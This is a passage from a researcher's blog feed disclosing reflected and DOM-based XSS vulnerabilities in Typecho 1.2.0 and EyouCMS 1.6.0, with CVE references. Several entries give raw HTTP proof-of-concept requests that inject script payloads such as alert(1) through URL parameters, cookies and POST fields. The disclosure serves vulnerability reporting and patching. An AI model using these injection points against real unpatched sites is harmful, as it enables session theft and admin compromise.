src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/5.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/6.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/4.png"></p><p>in <code>/admin/backup.php</code>:</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/8.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/9.png"><br><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-Reflected-XSS-(CVE-2023-xxxx)/7.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1535">Github Issue</a></li><li><a href="https://github.com/typecho/typecho/commit/f9ede542c9052ba22a6096d8412e2f02d9de872b">Github Commit</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend Reflected Cross-Site Scripting in backend /admin/index.php with arbitrarily supplied URL parameter.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Typecho V1.2.0 Backend DOM-Based XSS</title>
    <link href="https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/"/>
    <id>https://srpopty.github.io/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/</id>
    <published>2023-02-21T11:48:55.000Z</published>
    <updated>2023-02-21T11:48:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Typecho admin backend post editor with DOM-based XSS when adding a new post tag.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Typecho &lt;= 1.2.0</p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/1.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><ol><li>Login to admin backend management system.</li><li>Create a new or edit an existed post, in <code>admin/write-post.php</code> add a new tag.</li><li>If the new tag name contains the XSS payload, e.g. <code>&lt;li&gt;&lt;p&gt;aaa&lt;a&gt;test&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;</code>, it will be injected into a <code>&lt;li&gt;</code> html tag.</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;p&gt;aaa&lt;img src=x onerror=alert(1)&gt;aaa&lt;/p&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/2.png"></p><p><img src="/2023/02/21/Vulnerability-Typecho-V1.2.0-Backend-DOM-Based-XSS-(CVE-2023-xxxx)/3.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/typecho/typecho/issues/1536">Github Issue</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Typecho-V1.2.0 with Backend DOM-Based Cross-Site Scripting in backend /admin/write-post.php when creating new or editing existed post.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45542)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/</id>
    <published>2023-02-15T13:33:17.000Z</published>
    <updated>2023-02-15T13:33:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file management editor with reflected-XSS in the GET value <code>filename</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=edit&amp;filename=li|&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--sts_media.htm&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;activepath=%3Atemplate%3Amobile&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45542)/201612233-8e16dccb-774b-433b-b6f2-306216deb043.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/33">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45542">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend loing.php when editing file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45537)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/</id>
    <published>2023-02-15T13:18:35.000Z</published>
    <updated>2023-02-15T13:18:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Background article publish with reflected-XSS in the cookie <code>ENV_LIST_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D=cn; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45537)/201614458-17b781bf-148a-419c-9b92-7e9f0527d78d.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/34">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45537">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45538)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/</id>
    <published>2023-02-15T13:12:41.000Z</published>
    <updated>2023-02-15T13:12:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article publish with reflected-XSS in the cookie <code>ENV_GOBACK_URL</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Article&amp;a=add&amp;typeid=10&amp;gourl=http%3A%2F%2F10.142.11.10%3A20003%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26typeid%3D10%26lang%3Dcn&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; workspaceParam=index%7CArchives; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3D&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>383</span><br><span class="line"></span><br><span class="line"><span class="language-sas">gourl=<span class="variable">&amp;free_content</span>=<span class="variable">&amp;htmlfilename</span>=<span class="variable">&amp;type_tempview</span>=view_article.htm<span class="variable">&amp;tempview</span>=view_article.htm<span class="variable">&amp;add_time</span>=2022-11-05+20:47:11<span class="variable">&amp;arcrank</span>=0<span class="variable">&amp;click</span>=846<span class="variable">&amp;author</span>=aa<span class="variable">&amp;seo_description</span>=gaeg<span class="variable">&amp;seo_keywords</span>=egae<span class="variable">&amp;seo_title</span>=aeg<span class="variable">&amp;tags</span>=aeg%2C<span class="title function_">%E6</span>%93%8D<span class="title function_">%E4</span><span class="title function_">%BD</span>%9C<span class="title function_">%E7</span><span class="title function_">%B3</span><span class="title function_">%BB</span><span class="title function_">%E7</span><span class="title function_">%BB</span>%9F<span class="variable">&amp;addonFieldExt</span>[content]=&lt;p&gt;aegaeg&lt;/p&gt;<span class="variable">&amp;size</span>=1<span class="variable">&amp;part_free</span>=0<span class="variable">&amp;users_price</span>=<span class="variable">&amp;litpic_remote</span>=<span class="variable">&amp;litpic_local</span>=<span class="variable">&amp;jumplinks</span>=<span class="variable">&amp;typeid</span>=11<span class="variable">&amp;title</span>=aegaeg</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45538)/201615717-be81fb04-1140-4e59-b83b-16244cab3fc8.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/35">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45538">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when publishing article.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45541)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/</id>
    <published>2023-02-15T13:03:58.000Z</published>
    <updated>2023-02-15T13:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article attribute type changing with reflected-XSS in the POST value <code>value</code> when the value contains non-integer char, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Index&amp;a=changeTableVal&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=ArchivesFlag&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex; ENV_IS_UPHTML=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>90</span><br><span class="line"></span><br><span class="line"><span class="language-sas">value=<span class="title function_">%BA0</span>&lt;script&gt;alert(1)&lt;/script&gt;<span class="variable">&amp;field</span>=status<span class="variable">&amp;id_value</span>=1<span class="variable">&amp;id_name</span>=id<span class="variable">&amp;table</span>=archives_flag</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45541)/201617314-9974739a-12ef-4da5-9bbc-dc252941a50c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/36">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45541">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend  loing.php when changing article attribute type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45540)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/</id>
    <published>2023-02-15T12:47:27.000Z</published>
    <updated>2023-02-15T12:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend article type adding with reflected-XSS in the post value <code>name</code> when the value contains malformed UTF-8 chars, this xss payload will be showed in error reporting message.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;_ajax=1&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Field&amp;a=arctype_add&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; 